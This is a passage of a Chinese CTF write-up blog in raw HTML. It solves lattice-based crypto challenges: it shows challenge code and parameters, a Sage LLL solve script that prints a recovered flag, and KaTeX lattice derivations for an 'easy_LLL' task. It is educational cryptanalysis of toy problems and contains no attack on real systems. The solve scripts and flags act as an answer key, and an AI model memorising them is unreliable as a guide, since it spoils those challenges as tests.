getPrime(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">b = (a*m + c) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span></span><br><span class="line"><span class="string">b = 87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span></span><br><span class="line"><span class="string">p = 131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/m0_74345946/article/details/131742665">https://blog.csdn.net/m0_74345946/article/details/131742665</a>  抄的人家的P5<br>终于上sage了</p><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto. Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b = <span class="number">169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span></span><br><span class="line">a = <span class="number">87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span></span><br><span class="line">p = <span class="number">131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a*r = flag + k*p</span></span><br><span class="line"></span><br><span class="line">M = Matrix(</span><br><span class="line"></span><br><span class="line">    ZZ, [[p, <span class="number">0</span>, <span class="number">0</span>], [-b, <span class="number">1</span>, <span class="number">0</span>], [a, <span class="number">0</span>, <span class="number">2</span>**<span class="number">400</span>]]  <span class="comment"># 400=c.bits</span></span><br><span class="line"></span><br><span class="line">)  <span class="comment"># Matrix()函数通常采用数值作为参数并返回一个矩阵对象</span></span><br><span class="line">c, m, k = M. LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="string">&quot;&quot;&quot;LLL 算法是一种格约化算法，用于查找格的约简基。</span></span><br><span class="line"><span class="string">LLL 方法返回一个由两个元素组成的元组：</span></span><br><span class="line"><span class="string">简化基和将原始基转换为简化基的矩阵&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(<span class="built_in">abs</span>(m))  <span class="comment"># abs()返回数字的绝对值</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;ee5cb1a5-257a-48b0-9d62-9ef56ff0651a&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/WP/geek2024/lll.png" alt=""></p><h2 id="easy-LLL">easy_LLL</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() ==  <span class="number">255</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m</span>):</span><br><span class="line">    a = getPrime(<span class="number">1024</span>)</span><br><span class="line">    b = getPrime(<span class="number">400</span>)</span><br><span class="line">    c = (a * m + b) % p</span><br><span class="line">    <span class="keyword">return</span> c, a</span><br><span class="line"></span><br><span class="line">result = [encrypt(m) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">c = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> result]</span><br><span class="line">a = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> result]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span></span><br><span class="line"><span class="string">c = [25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980, 75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974, 4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536, 16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193, 106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500]</span></span><br><span class="line"><span class="string">a = [177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539, 154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561, 162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877, 156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623, 94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://dexterjie.github.io/2023/08/25/%E6%A0%BC%E5%AF%86%E7%A0%81%E8%BF%9B%E9%98%B6/">https://dexterjie.github.io/2023/08/25/格密码进阶/</a><br><img src="/img/WP/geek2024/ge.png" alt=""><br>我们这题的格跟这个很像。<s>因为我不会在博客写格，凑合着看吧</s><br>注：已补上格。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub><mo>≡</mo><msub><mi>a</mi><mi>i</mi></msub><mo>×</mo><mi>m</mi><mo>+</mo><mi>b</mi><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">    c_i \equiv a_i \times m + b \ \mathrm {mod} \ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6138em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">b</span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">p</span></span></span></span></span></p><p>经过等价替换可得到：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub><mo>=</mo><msub><mi>a</mi><mi>i</mi></msub><mo>×</mo><mi>m</mi><mo>+</mo><mi>b</mi><mo>+</mo><msub><mi>l</mi><mi>i</mi></msub><mo>×</mo><mi>p</mi><mspace linebreak="newline"></mspace><msub><mi>a</mi><mi>i</mi></msub><mo>×</mo><mi>m</mi><mo>+</mo><msub><mi>l</mi><mi>i</mi></msub><mo>×</mo><mi>p</mi><mo>−</mo><msub><mi>c</mi><mi>i</mi></msub><mo>=</mo><mo>−</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">    c_i=a_i \times m+b+l_i \times p \\    a_i \times m+l_i \times p-c_i=-b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord mathnormal">b</span></span></span></span></span></p><p>于是我们可以得到一个跟上图差不多的格，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>e</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">secret</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">secre</span><span class="mord mathnormal">t</span></span></span></span>就是我们所求的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">b_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是我们的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">r_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是我们的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">c_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。<br>右边的向量即为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mi mathvariant="normal">/</mi><mi>p</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>K</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix}b &amp; b &amp; b &amp; \dots &amp; K/p &amp; -K\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord">/</span><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span><br>格构造如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mstyle mathsize="0.9em"><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>l</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>l</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>l</mi><mi>n</mi></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.6667em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.6667em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.6667em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.6667em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.6667em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mi>n</mi></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mi mathvariant="normal">/</mi><mi>p</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" 